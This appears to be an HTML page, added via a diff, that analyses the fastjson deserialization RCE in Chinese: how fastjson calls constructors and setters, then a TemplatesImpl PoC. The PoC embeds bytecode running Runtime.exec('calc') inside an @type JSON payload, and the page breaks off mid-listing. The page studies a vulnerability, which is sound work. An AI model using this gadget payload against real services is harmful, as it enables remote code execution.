@@ -1,0 +1,773 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+   <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+   <style type="text/css">
+   /*CSS stylesheet is based on killwing's flavored markdown style:https://gist.github.com/2937864*/body{    margin: 0 auto;    font: 13px/1.231 Helvetica, Arial, sans-serif;    color: #444444;    line-height: 1;    max-width: 960px;    padding: 5px;}h1, h2, h3, h4 {    color: #111111;    font-weight: 400;}h1, h2, h3, h4, h5, p {    margin-bottom: 16px;    padding: 0;}h1 {    font-size: 28px;}h2 {    font-size: 22px;    margin: 20px 0 6px;}h3 {    font-size: 21px;}h4 {    font-size: 18px;}h5 {    font-size: 16px;}a {    color: #0099ff;    margin: 0;    padding: 0;    vertical-align: baseline;}a:link,a:visited{ text-decoration:none;}a:hover{ text-decoration:underline;}ul, ol {    padding: 0;    margin: 0;}li {    line-height: 24px;    margin-left: 44px;}li ul, li ul {    margin-left: 24px;}ul, ol {    font-size: 14px;    line-height: 20px;    max-width: 540px;}p {    font-size: 14px;    line-height: 20px;    max-width: 540px;    margin-top: 3px;}pre {    padding: 0px 4px;    max-width: 800px;    white-space: pre-wrap;    font-family: Consolas, Monaco, Andale Mono, monospace;    line-height: 1.5;    font-size: 13px;    border: 1px solid #ddd;    background-color: #f7f7f7;    border-radius: 3px;}code {    font-family: Consolas, Monaco, Andale Mono, monospace;    line-height: 1.5;    font-size: 13px;    border: 1px solid #ddd;    background-color: #f7f7f7;    border-radius: 3px;}pre code {    border: 0px;}aside {    display: block;    float: right;    width: 390px;}blockquote {    border-left:.5em solid #40AA53;    padding: 0 2em;    margin-left:0;    max-width: 476px;}blockquote  cite {    font-size:14px;    line-height:20px;    color:#bfbfbf;}blockquote cite:before {    content: '\2014 \00A0';}blockquote p {      color: #666;    max-width: 460px;}hr {    height: 1px;    border: none;    border-top: 1px dashed #0066CC}button,input,select,textarea {  font-size: 100%;  margin: 0;  vertical-align: baseline;  *vertical-align: middle;}button, input {  line-height: normal;  *overflow: visible;}button::-moz-focus-inner, input::-moz-focus-inner {  border: 0;  padding: 0;}button,input[type="button"],input[type="reset"],input[type="submit"] {  cursor: pointer;  -webkit-appearance: button;}input[type=checkbox], input[type=radio] {  cursor: pointer;}/* override default chrome & firefox settings */input:not([type="image"]), textarea {  -webkit-box-sizing: content-box;  -moz-box-sizing: content-box;  box-sizing: content-box;}input[type="search"] {  -webkit-appearance: textfield;  -webkit-box-sizing: content-box;  -moz-box-sizing: content-box;  box-sizing: content-box;}input[type="search"]::-webkit-search-decoration {  -webkit-appearance: none;}label,input,select,textarea {  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;  font-size: 13px;  font-weight: normal;  line-height: normal;  margin-bottom: 18px;}input[type=checkbox], input[type=radio] {  cursor: pointer;  margin-bottom: 0;}input[type=text],input[type=password],textarea,select {  display: inline-block;  width: 210px;  padding: 4px;  font-size: 13px;  font-weight: normal;  line-height: 18px;  height: 18px;  color: #808080;  border: 1px solid #ccc;  -webkit-border-radius: 3px;  -moz-border-radius: 3px;  border-radius: 3px;}select, input[type=file] {  height: 27px;  line-height: 27px;}textarea {  height: auto;}/* grey out placeholders */:-moz-placeholder {  color: #bfbfbf;}::-webkit-input-placeholder {  color: #bfbfbf;}input[type=text],input[type=password],select,textarea {  -webkit-transition: border linear 0.2s, box-shadow linear 0.2s;  -moz-transition: border linear 0.2s, box-shadow linear 0.2s;  transition: border linear 0.2s, box-shadow linear 0.2s;  -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);  -moz-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);  box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);}input[type=text]:focus, input[type=password]:focus, textarea:focus {  outline: none;  border-color: rgba(82, 168, 236, 0.8);  -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6);  -moz-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6);  box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6);}/* buttons */button {  display: inline-block;  padding: 4px 14px;  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;  font-size: 13px;  line-height: 18px;  -webkit-border-radius: 4px;  -moz-border-radius: 4px;  border-radius: 4px;  -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);  -moz-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);  background-color: #0064cd;  background-repeat: repeat-x;  background-image: -khtml-gradient(linear, left top, left bottom, from(#049cdb), to(#0064cd));  background-image: -moz-linear-gradient(top, #049cdb, #0064cd);  background-image: -ms-linear-gradient(top, #049cdb, #0064cd);  background-image: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #049cdb), color-stop(100%, #0064cd));  background-image: -webkit-linear-gradient(top, #049cdb, #0064cd);  background-image: -o-linear-gradient(top, #049cdb, #0064cd);  background-image: linear-gradient(top, #049cdb, #0064cd);  color: #fff;  text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);  border: 1px solid #004b9a;  border-bottom-color: #003f81;  -webkit-transition: 0.1s linear all;  -moz-transition: 0.1s linear all;  transition: 0.1s linear all;  border-color: #0064cd #0064cd #003f81;  border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25);}button:hover {  color: #fff;  background-position: 0 -15px;  text-decoration: none;}button:active {  -webkit-box-shadow: inset 0 3px 7px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05);  -moz-box-shadow: inset 0 3px 7px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05);  box-shadow: inset 0 3px 7px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05);}button::-moz-focus-inner {  padding: 0;  border: 0;}/* table  */table {    border-spacing: 0;    border: 1px solid #ccc;}td, th{    border: 1px solid #ccc;    padding: 5px;}/* code syntax highlight.Documentation: http://www.mdcharm.com/documentation/code_syntax_highlighting.html#custom_your_own */pre .literal,pre .comment,pre .template_comment,pre .diff .header,pre .javadoc {    color: #008000;}pre .keyword,pre .css .rule .keyword,pre .winutils,pre .javascript .title,pre .nginx .title,pre .subst,pre .request,pre .status {    color: #0000FF;    font-weight: bold}pre .number,pre .hexcolor,pre .python .decorator,pre .ruby .constant {    color: #0000FF;}pre .string,pre .tag .value,pre .phpdoc,pre .tex .formula {    color: #D14}pre .title,pre .id {    color: #900;    font-weight: bold}pre .javascript .title,pre .lisp .title,pre .clojure .title,pre .subst {    font-weight: normal}pre .class .title,pre .haskell .type,pre .vhdl .literal,pre .tex .command {    color: #458;    font-weight: bold}pre .tag,pre .tag .title,pre .rules .property,pre .django .tag .keyword {    color: #000080;    font-weight: normal}pre .attribute,pre .variable,pre .lisp .body {    color: #008080}pre .regexp {    color: #009926}pre .class {    color: #458;    font-weight: bold}pre .symbol,pre .ruby .symbol .string,pre .lisp .keyword,pre .tex .special,pre .prompt {    color: #990073}pre .built_in,pre .lisp .title,pre .clojure .built_in {    color: #0086b3}pre .preprocessor,pre .pi,pre .doctype,pre .shebang,pre .cdata {    color: #999;    font-weight: bold}pre .deletion {    background: #fdd}pre .addition {    background: #dfd}pre .diff .change {    background: #0086b3}pre .chunk {    color: #aaa}pre .markdown .header {    color: #800;    font-weight: bold;}pre .markdown .blockquote {    color: #888;}pre .markdown .link_label {    color: #88F;}pre .markdown .strong {    font-weight: bold;}pre .markdown .emphasis {    font-style: italic;}
+   </style>
+   
+   
+</head>
+<body>
+    <p><center><font size=6>fastjson反序列化漏洞分析</font></center></p>
+
+<h1>1.fastjson简介</h1>
+
+<p>fastjson是阿里的开源程序，实现java对象和json数据格式的相互转换，其号称性能很好，在国内被广泛应用。</p>
+
+<h2>1.1 漏洞影响访问</h2>
+
+<p>fastjson版本低于1.2.24时，能形成RCE。</p>
+
+<h2>1.2 fastjson使用</h2>
+
+<h3>1.2.1 序列化</h3>
+
+<p><font color=red>序列化过程不会影响我们分析fastjson漏洞，这里只做简单介绍。</font></p>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> {</span>
+    <span class="keyword">public</span> String name;
+    <span class="keyword">private</span> <span class="keyword">int</span> age;
+    <span class="keyword">private</span> School school;
+    <span class="keyword">public</span> Person(){
+        System.out.println(<span class="string">"in no param constructor"</span>);
+    }
+    <span class="keyword">public</span> Person(String str, <span class="keyword">int</span> n,School school){
+        System.out.println(<span class="string">"Inside Person's Constructor"</span>);
+        name = str;
+        age = n;
+        <span class="keyword">this</span>.school =school;
+    }
+}
+
+</code></pre>
+
+<p>对Person对象序列化，发现仅name属性会被序列化。</p>
+
+<p><img src=11.png></img></p>
+
+<p>修改Person类，未age成员添加public的Getter：</p>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> {</span>
+    <span class="keyword">public</span> String name;
+    <span class="keyword">private</span> <span class="keyword">int</span> age;
+    <span class="keyword">private</span> School school;
+    <span class="keyword">public</span> Person(){
+        System.out.println(<span class="string">"in no param constructor"</span>);
+    }
+    <span class="keyword">public</span> Person(String str, <span class="keyword">int</span> n,School school){
+        System.out.println(<span class="string">"Inside Person's Constructor"</span>);
+        name = str;
+        age = n;
+        <span class="keyword">this</span>.school =school;
+    }
+
+    <span class="keyword">public</span> <span class="keyword">int</span> getAge(){
+        System.out.println(<span class="string">"in getAge"</span>);
+        <span class="keyword">return</span> age;
+    }
+</code></pre>
+
+<p>拥有public的Getter的name属性也被序列化：</p>
+
+<p><img src=12.png></img></p>
+
+<p>同理，当School成员是public或者拥有public Getter时，会对其序列化。School对象的成员序列化过程和此一致。</p>
+
+<p><b>结论：</b></p>
+
+<ul>
+<li>从对象角度，序列化过程是一种读操作；</li>
+<li>对于public属性的成员，序列化时能直接访问，所以能够会对其序列化；</li>
+<li>对于非public属性的成员，如果有public的getXyz()方法，将调用getXyz()方法完成序列化；</li>
+<li>对于非public属性成员，且无public的getter，则不会对其序列化。</li>
+</ul>
+
+<p><b>以上结论除了实验外，也有理论依据：fastjson组件和序列化的类不在一个package，要想完成序列化，必须拥有对应的成员的访问权限，当且仅当属性为public或者提过了public的getter方法时，fastjson 才能读取此成员属性。</b></p>
+
+<h3>1.2.2 反序列化</h3>
+
+<p>上述序列化过程虽然对我们分析fastjson漏洞没有影响，但<b>理解反序列化过程中的一些细节个人觉得对理解fastjson反序列化RCE很有必要。</b></p>
+
+<p><b>(1) 普通类的反序列化</b></p>
+
+<pre><code class="java">
+<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> {</span>
+    <span class="keyword">private</span> String name;
+    <span class="keyword">public</span> <span class="keyword">int</span> age;
+
+    <span class="keyword">public</span> Person(){
+        System.out.println(<span class="string">"in no param constructor"</span>);
+    }
+    <span class="keyword">public</span> Person(String str, <span class="keyword">int</span> n){
+        System.out.println(<span class="string">"Inside Person's Constructor"</span>);
+        name = str;
+        age = n;
+    }
+   <span class="keyword">public</span> String getName(){
+        System.out.println(<span class="string">"in getName"</span>);
+        <span class="keyword">return</span> name;
+    }
+
+    <span class="keyword">public</span> <span class="keyword">int</span> getAge(){
+        System.out.println(<span class="string">"in getAge"</span>);
+        <span class="keyword">return</span> age;
+    }
+ }
+</code></pre>
+
+<pre><code class="java">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args){
+        Person p = <span class="keyword">new</span> Person(<span class="string">"venscor"</span>,<span class="number">25</span>);
+        String s = JSON.toJSONString(p);
+        System.out.println(s);
+        System.out.println(<span class="string">"******test fastjson str 2 obj******"</span>);
+        Person pp = (Person)JSON.parseObject(s,Person.class);
+        System.out.println(JSON.toJSONString(pp));
+    }
+</code></pre>
+
+<p>运行测试代码，发现反序列化是通过调用对象的无参构造器完成的，且仅age成员被反序列化。</p>
+
+<p><img src=13.png></img></p>
+
+<p>继续修改Person类，为name成员添加public的Setter方法：</p>
+
+<pre><code class="java">
+<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> {</span>
+
+    <span class="keyword">private</span> String name;
+    <span class="keyword">public</span> <span class="keyword">int</span> age;
+
+    <span class="keyword">public</span> Person(){
+        System.out.println(<span class="string">"in no param constructor"</span>);
+    }
+    <span class="keyword">public</span> Person(String str, <span class="keyword">int</span> n){
+        System.out.println(<span class="string">"Inside Person's Constructor"</span>);
+        name = str;
+        age = n;
+    }
+   <span class="keyword">public</span> String getName(){
+        System.out.println(<span class="string">"in getName"</span>);
+        <span class="keyword">return</span> name;
+    }
+
+    <span class="keyword">public</span> <span class="keyword">int</span> getAge(){
+        System.out.println(<span class="string">"in getAge"</span>);
+        <span class="keyword">return</span> age;
+    }
+
+
+    <span class="keyword">public</span>  <span class="keyword">void</span> setName(String str){
+        System.out.println(<span class="string">"in setname"</span>);
+        <span class="keyword">this</span>.name = str;
+    }
+
+}
+
+
+</code></pre>
+
+<p>继续运行测试方法，发现有了public Setter的name成员也被反序列化。</p>
+
+<p><img src=14.png></img></p>
+
+<p>通过上述实验，我们发现：</p>
+
+<p><b>a. fastjson反序列化是通过调用对象的无参构造器完成的；</b></p>
+
+<p><b>b. 反序列化是从对象角度属于"写操作"，仅对象的成员为public或者拥有public Setter时，才会被反序列化。否则，要么该成员为0(基础数据类型)，要么为null(除基础类型)。</b></p>
+
+<p><b>(2) 稍复杂类的反序列</b></p>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonParent</span> {</span>
+    <span class="keyword">private</span> String family;
+
+    <span class="keyword">public</span> PersonParent(String family) {
+        System.out.println(<span class="string">"in PersonParent with param constructor"</span>);
+        <span class="keyword">this</span>.family = family;
+    }
+
+    <span class="keyword">public</span> PersonParent() {
+        System.out.println(<span class="string">"in PersonParent no param constructor"</span>);
+    }
+
+    <span class="keyword">public</span> String getFamily() {
+        <span class="keyword">return</span> family;
+    }
+
+    <span class="keyword">public</span> <span class="keyword">void</span> setFamily(String family) {
+        <span class="keyword">this</span>.family = family;
+    }
+}
+
+
+</code></pre>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">extends</span> <span class="title">PersonParent</span> <span class="keyword">implements</span> <span class="title">ParentInterface</span>{</span>
+    <span class="keyword">private</span> String name;
+    <span class="keyword">public</span> <span class="keyword">int</span> age;
+    <span class="keyword">private</span> School school;
+    <span class="keyword">public</span> Person(){
+        System.out.println(<span class="string">"in no param constructor"</span>);
+    }
+    <span class="keyword">public</span> Person(String str, <span class="keyword">int</span> n,School school){
+        System.out.println(<span class="string">"Inside Person's Constructor"</span>);
+        name = str;
+        age = n;
+        <span class="keyword">this</span>.school = school;
+    }
+   <span class="keyword">public</span> String getName(){
+        <span class="keyword">return</span> name;
+    }
+
+    <span class="keyword">public</span> <span class="keyword">int</span> getAge(){
+        <span class="keyword">return</span> age;
+    }
+
+    <span class="keyword">public</span> School getSchool() {
+
+        <span class="keyword">return</span> school;
+    }
+
+    <span class="keyword">public</span>  <span class="keyword">void</span> setSchool(School school) {
+        System.out.println(<span class="string">"in setSchool"</span>);
+        <span class="keyword">this</span>.school = school;
+    }
+
+    <span class="keyword">public</span>  <span class="keyword">void</span> setName(String str){
+        System.out.println(<span class="string">"in setname"</span>);
+        <span class="keyword">this</span>.name = str;
+    }
+
+
+    <span class="keyword">public</span> String test() {
+        <span class="keyword">return</span> <span class="keyword">null</span>;
+    }
+
+}
+
+</code></pre>
+
+<p>继续测试程序：</p>
+
+<p><img src=15.png></img></p>
+
+<p>上面反序列化的对象，其成员包含了其他对象成员，并且还有父类和接口，从运行结果大致可以看出：<b>对象反序列化时，先调用父类无参构造器生成父类对象，然后调用对象成员的无参构造器生成对象成员，之后调用Setter方法得到其他的成员。</b></p>
+
+<p><b>(3) 非public属性成员序列化</b> </p>
+
+<p>按照上面的分析，默认情况下，对于对package域外不可写的成员，fastjson默认是不会对其反序列化的。抛开fastjson怎么做的不言，我们思考一个问题，假如我们自己实现这个功能：支持对private属性的成员序列化/反序列化，我们应该怎么做？</p>
+
+<p>对java熟悉的同学肯定能想到，java反射机制能够实现对私有成员的读写。既然我们都能想到，fastjson没有理由不支持这一功能。</p>
+
+<p>fastjson反序列化私有成员时，需要设置Feature.SupportNonPublicField。下面我们具体研究下fastjson针对私有成员的反序列化过程。</p>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> {</span>
+    <span class="keyword">private</span> String name;
+    <span class="keyword">private</span> <span class="keyword">int</span> grade;
+    <span class="keyword">private</span> <span class="keyword">int</span> num;
+    <span class="keyword">private</span> School _school;
+
+    <span class="keyword">public</span> String getName() {
+        System.out.println(<span class="string">"in getName"</span>);
+        <span class="keyword">return</span> name;
+    }
+
+    <span class="keyword">public</span> School get_school() {
+        System.out.println(<span class="string">"in get_school"</span>);
+        <span class="keyword">return</span> _school;
+    }
+
+
+
+    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> getNum() {
+        System.out.println(<span class="string">"getNum"</span>);
+        <span class="keyword">return</span> num;
+    }
+
+    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> setNum(<span class="keyword">int</span> num) {
+        System.out.println(<span class="string">"setNum"</span>);
+        <span class="keyword">this</span>.num = num;
+    }
+
+    <span class="keyword">public</span> Student() {
+        System.out.println(<span class="string">"Student no param constructor"</span>);
+    }
+
+    <span class="keyword">public</span> Student(String name, <span class="keyword">int</span> grade,<span class="keyword">int</span> num,School school) {
+        System.out.println(<span class="string">"Student 3 param constructor"</span>);
+        <span class="keyword">this</span>.name = name;
+        <span class="keyword">this</span>.grade = grade;
+        <span class="keyword">this</span>.num = num;
+        <span class="keyword">this</span>._school = school;
+    }
+
+    <span class="keyword">void</span> print(){
+        System.out.println(<span class="string">"name:"</span>+name+<span class="string">"\ngrade:"</span>+grade+<span class="string">"\nnum:"</span>+num+<span class="string">"\nSchool:"</span>+_school.getName());
+    }
+}
+
+</code></pre>
+
+<p>测试代码：</p>
+
+<pre><code class="java">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> main(String[]args){
+        ParserConfig config = <span class="keyword">new</span> ParserConfig();
+        String s = <span class="string">"{\"name\":\"venscor\",\"grade\":3,\"num\":100,\"_school\":{\"name\":\"xidian\"}}"</span>;
+        System.out.println(s);
+        System.out.println(<span class="string">"**********************"</span>);
+        Student obj = (Student)JSON.parseObject(s, Student.class, config, Feature.SupportNonPublicField);
+
+        System.out.println(<span class="string">"-----------------------------"</span>);
+        obj.print();
+    }
+</code></pre>
+
+<p>运行结果：</p>
+
+<p><img src=16.png></img></p>
+
+<p>从运行结果可以看出，除了对private成员进行了反序列化，其他并没有什么差别。</p>
+
+<p><b>(4) 反序列化源码分析</b></p>
+
+<p>对常规java类的反序列化函数调用栈大致如下：</p>
+
+<p><img src=17.png></img></p>
+
+<p>对对象成员的处理主要在FieldDeserializer类的setValue()方法，我们简要分析下这个函数的源码：</p>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="keyword">void</span> setValue(Object object, Object value) {
+        <span class="keyword">if</span> (value != <span class="keyword">null</span> || !<span class="keyword">this</span>.fieldInfo.fieldClass.isPrimitive()) {
+            <span class="keyword">try</span> {
+                Method method = <span class="keyword">this</span>.fieldInfo.method;
+                <span class="keyword">if</span> (method != <span class="keyword">null</span>) {
+                    <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.getOnly) {
+                        <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicInteger.class) {
+                            AtomicInteger atomic = (AtomicInteger)method.invoke(object);
+                            <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) {
+                                atomic.set(((AtomicInteger)value).get());
+                            }
+                        } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicLong.class) {
+                            AtomicLong atomic = (AtomicLong)method.invoke(object);
+                            <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) {
+                                atomic.set(((AtomicLong)value).get());
+                            }
+                        } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicBoolean.class) {
+                            AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);
+                            <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) {
+                                atomic.set(((AtomicBoolean)value).get());
+                            }
+                        } <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) {
+                            Map map = (Map)method.invoke(object);
+                            <span class="keyword">if</span> (map != <span class="keyword">null</span>) {
+                                map.putAll((Map)value);
+                            }
+                        } <span class="keyword">else</span> {
+                            Collection collection = (Collection)method.invoke(object);
+                            <span class="keyword">if</span> (collection != <span class="keyword">null</span>) {
+                                collection.addAll((Collection)value);
+                            }
+                        }
+                    } <span class="keyword">else</span> {
+                        method.invoke(object, value);
+                    }
+
+                } <span class="keyword">else</span> {
+                    Field field = <span class="keyword">this</span>.fieldInfo.field;
+                    <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.getOnly) {
+                        <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicInteger.class) {
+                            AtomicInteger atomic = (AtomicInteger)field.get(object);
+                            <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) {
+                                atomic.set(((AtomicInteger)value).get());
+                            }
+                        } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicLong.class) {
+                            AtomicLong atomic = (AtomicLong)field.get(object);
+                            <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) {
+                                atomic.set(((AtomicLong)value).get());
+                            }
+                        } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicBoolean.class) {
+                            AtomicBoolean atomic = (AtomicBoolean)field.get(object);
+                            <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) {
+                                atomic.set(((AtomicBoolean)value).get());
+                            }
+                        } <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(<span class="keyword">this</span>.fieldInfo.fieldClass)) {
+                            Map map = (Map)field.get(object);
+                            <span class="keyword">if</span> (map != <span class="keyword">null</span>) {
+                                map.putAll((Map)value);
+                            }
+                        } <span class="keyword">else</span> {
+                            Collection collection = (Collection)field.get(object);
+                            <span class="keyword">if</span> (collection != <span class="keyword">null</span>) {
+                                collection.addAll((Collection)value);
+                            }
+                        }
+                    } <span class="keyword">else</span> <span class="keyword">if</span> (field != <span class="keyword">null</span>) {
+                        field.set(object, value);
+                    }
+
+                }
+            } <span class="keyword">catch</span> (Exception var<span class="number">6</span>) {
+                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"set property error, "</span> + <span class="keyword">this</span>.fieldInfo.name, var<span class="number">6</span>);
+            }
+        }
+   }
+</code></pre>
+
+<p>整个函数处理过程比较简单，首先，会查看原Json数据里的成员是否存在对应的Setter或者Getter。如果对应的成员不是只读的，则通过反射调用setter。对于某些成员是特殊类型，会调用其Getter方法，例如其Getter返回值是Map类型。对于成员没有对应的Getter和Setter的，如果成员是public的，则直接利用java反射设置其值。如果成员是只读的，那么根据成员类型调用对应的反射来设置。(对是否支持Feature.SupportNonPublicField在此函数之前。)</p>
+
+<h3><b>1.2.4 结论</b></h3>
+
+<ul>
+    <li>fastjson反序列化过程一种“写操作”，对象的生成是通过直接调用无参构造器完成的；</li>
+    <li>默认情况下，fastjson仅反序列化public 成员或者有public Setter的成员；</li>
+    <li>对象有父类，或者其成员也是对象时，他们也会被反序列化，反序列化顺序我们不关心。</li>
+    <li>java对象反序列化时，对于public的Setter只要json中有对应的field，则setter就会被调用，而不管其对应的field是否真实存在。例如，Person有个public setName(),但是没有name成员，只要待反序列化的json中有name的String，则setName就会被调用。</li>
+</ul>
+
+<h1>2. 产生漏洞的Demo</h1>
+
+<p>漏洞产生原理十分简单，当利用fastjson的parse()方法来反序列化时，如果生成对象的原始数据可以被攻击者控制，在代码环境下存在可利用的gadget时，则产生RCE漏洞。</p>
+
+<pre><code class="java">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args){        
+        String strUnderControl = <span class="string">""</span>;
+        JSON.parse(strUnderControl);
+    }
+</code></pre>
+
+<h1>3. PoC</h1>
+
+<p>有了第一节的分析，再分析poc就简单了，建议看此PoC前先消化第一节。</p>
+
+<h2>3.1 早期让人低估fastjson RCE威力的PoC</h2>
+
+<p>早起网上针对fastjson的PoC都是基于TemplatesImpl的，PoC如下。</p>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> {</span>
+    <span class="keyword">public</span> Test() <span class="keyword">throws</span> IOException {
+        Runtime.getRuntime().exec(<span class="string">"calc"</span>);
+    }
+
+    <span class="annotation">@Override</span>
+    <span class="keyword">public</span> <span class="keyword">void</span> transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
+    }
+
+    <span class="annotation">@Override</span>
+    <span class="keyword">public</span> <span class="keyword">void</span> transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) <span class="keyword">throws</span> TransletException {
+
+    }
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> Exception {
+        Test t = <span class="keyword">new</span> Test();
+    }
+}
+
+</code></pre>
+
+<pre><code class="java">
+<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> {</span>
+
+    <span class="keyword">public</span> <span class="keyword">static</span> String readClass(String cls){
+        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();
+        <span class="keyword">try</span> {
+            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);
+        } <span class="keyword">catch</span> (IOException e) {
+            e.printStackTrace();
+        }
+        <span class="keyword">return</span> Base<span class="number">6</span><span class="number">4</span>.encodeBase<span class="number">6</span><span class="number">4</span>String(bos.toByteArray());
+
+    }
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  test_autoTypeDeny() <span class="keyword">throws</span> Exception {
+        ParserConfig config = <span class="keyword">new</span> ParserConfig();
+        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);
+        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"\\target\\classes\\person\\Test.class"</span>;
+        String evilCode = readClass(evilClassPath);
+        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;
+        String text<span class="number">1</span> = <span class="string">"{\"@type\":\""</span> + NASTY_CLASS +
+                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],"</span> +
+                <span class="string">"'_name':'a.b',"</span> +
+                <span class="string">"'_tfactory':{ },"</span> +
+                <span class="string">"\"_outputProperties\":{ }}\n"</span>;
+        System.out.println(text<span class="number">1</span>);
+        <span class="comment">//String personStr = "{'name':"+text1+",'age':19}";</span>
+        <span class="comment">//Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField);</span>
+        Object obj = JSON.parseObject(text<span class="number">1</span>, Object.class,config, Feature.SupportNonPublicField);
+        <span class="comment">//assertEquals(Model.class, obj.getClass());</span>
+
+    }
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String args[]){
+
+        <span class="keyword">try</span> {
+            test_autoTypeDeny();
+        } <span class="keyword">catch</span> (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre>
+
+<p>我们看下TemplatesImpl类：</p>
+
+<pre><code class="java">
+<span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title">Templates</span>, <span class="title">Serializable</span> {</span>
+    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">673094361519270707</span>L;
+    <span class="keyword">private</span> <span class="keyword">static</span> String ABSTRACT_TRANSLET = <span class="string">"org.apache.xalan.xsltc.runtime.AbstractTranslet"</span>;
+    <span class="keyword">private</span> String _name = <span class="keyword">null</span>;
+    <span class="keyword">private</span> <span class="keyword">byte</span>[][] _bytecodes = (<span class="keyword">byte</span>[][])<span class="keyword">null</span>;
+    <span class="keyword">private</span> Class[] _class = <span class="keyword">null</span>;
+    <span class="keyword">private</span> <span class="keyword">int</span> _transletIndex = -<span class="number">1</span>;
+    <span class="keyword">private</span> Hashtable _auxClasses = <span class="keyword">null</span>;
+    <span class="keyword">private</span> Properties _outputProperties;
+    <span class="keyword">private</span> <span class="keyword">int</span> _indentNumber;
+    <span class="keyword">private</span> <span class="keyword">transient</span> URIResolver _uriResolver = <span class="keyword">null</span>;
